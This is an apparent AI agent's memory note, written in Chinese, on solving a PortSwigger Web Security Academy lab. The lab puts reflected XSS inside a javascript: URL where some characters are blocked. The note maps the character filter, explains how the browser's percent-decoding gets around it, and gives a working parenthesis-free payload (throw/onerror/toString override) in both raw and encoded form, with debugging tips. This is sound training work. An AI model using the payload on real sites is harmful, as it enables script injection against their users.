---
metadata:
  node_type: memory
name: "PRS arm A lab-javascript-url-some-characters-blocked"
description: "arm A 基线:lab-javascript-url-some-characters-blocked 冷实例一次通过 - 查询串反射进 javascript: URL 的 body:'...' 单引号串,服务端删 ()[]`\\ 并百分号编码 ';:<>=+@&,但浏览器解码还原 ⇒ 破串后用 throw/**/onerror=alert,1337 + toString 覆盖 gadget 无括号触发,page_alert fired + banner solved"
last_updated: 2026-10-09T00:19:10+08:00
created: 2026-10-09T00:19:10+08:00
---

# PRS arm A: lab-javascript-url-some-characters-blocked

日期: 2026-10-08(冷实例,一次通过)

- 题面路径: /web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked
- lab_id: C29F5F30A0C79A94F6A847A63911BFBB403F8D60977B3E3B09110D166711A345
- 实例: https://0ac600c70458701980c8039800ed00f7.web-security-academy.net/ (reused:false)
- 坑1: 首次 range_launch 回 instance_url:null、final_url 落 portswigger.net/web-security/,同参重试即成功(瞬时,非会话过期)

## 反射面(实测)
`/post?postId=4` 页尾:
```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26<Q>'}).finally(_ => window.location = '/')">Back to Blog</a>
```
整个查询串被塞进 `body:'...'` 这个单引号 JS 串,外层是双引号 href 属性。

## 服务端过滤面(逐字符探针实测)
- 直接删除: `` ` `` `\` `[` `]` `(` `)`
- 百分号编码: `'`→%27 `;`→%3b `:`→%3a `<`→%3c `>`→%3e `=`→%3d `+`→%2b `@`→%40 `&`→%26;空格→`+`
- 原样保留: `"` `/` `$` `^` `|` `,` `.` `!` `*` `~` `{` `}` tab
- 关键推论: 浏览器执行 javascript: URL 前会做百分号解码 ⇒ `'` `;` `=` `>` `+` 全部复原,可破串;但 `(` `)` 被删且不可复原 ⇒ alert 只能用无括号写法。

## 载荷(请求里按上面规则编码,串内不得出现空格)
```
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```
请求形: `?postId=4&%27%7d%2cx%3dx%3d%3e%7bthrow/**/onerror%3dalert%2c1337%7d%2ctoString%3dx%2cwindow%2b%27%27%2c%7bx%3a%27`
解码后拼成 `fetch(...,{...:'...'} , x=>{throw onerror=alert,1337}, toString=x, window+'', {x:''})`,
`window+''` 触发被覆盖的 toString ⇒ 箭头体执行 `throw onerror=alert,1337`。
触发: 点 `.is-linkback a`。

## 证据
- page_alert --click '.is-linkback a' ⇒ fired=true, alerts=["alert:Uncaught 1337"]
- banner_verdict ⇒ solved=true, "Congratulations, you solved the lab!"

## 本批坑
1. 注释写错成 `/**` 而非 `/**/` ⇒ JS 报 "Illegal newline after throw",page_alert fired=false;用 browser_suite eval 取 href 原文 + `decodeURIComponent` + `new Function` 做语法验尸最快。
2. 属性逃逸(裸 `"` 可保留)看似可行,实则被 `=` 自身被编码 + 空格→`+` 堵死(必须自备 `=` 才能挂事件处理器),故本波只走 JS 串破口。

